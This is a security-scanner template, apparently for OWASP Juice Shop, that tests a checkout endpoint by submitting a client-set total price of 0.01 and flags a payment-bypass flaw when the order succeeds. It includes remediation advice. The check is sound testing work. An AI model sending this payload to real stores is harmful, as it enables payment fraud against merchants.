id: juice-shop-price-manipulation
info:
  name: Price Manipulation Business Logic Flaw
  description: Server accepts client-provided price values allowing payment bypass
  owasp_category: A02:2025
  severity: critical
  tags:
    - business-logic
    - payment-bypass
    - input-validation

requests:
  - name: Checkout with modified total
    method: POST
    path: /rest/basket/{{basket_id}}/checkout
    headers:
      Authorization: "{{bearer_token}}"
      Content-Type: application/json
    body: '{"couponData": "bnVsbA==", "orderDetails": {"totalPrice": 0.01}}'
    matchers_condition: and
    matchers:
      - type: status
        values: [200, 201]
      - type: word
        words:
          - '"orderConfirmation"'
          - '"status":"success"'
        condition: or
    on_match:
      vulnerability: PRICE_MANIPULATION
      message: Checkout accepts modified total price - payment bypass possible
      remediation: Always calculate total server-side; never trust client-provided totals
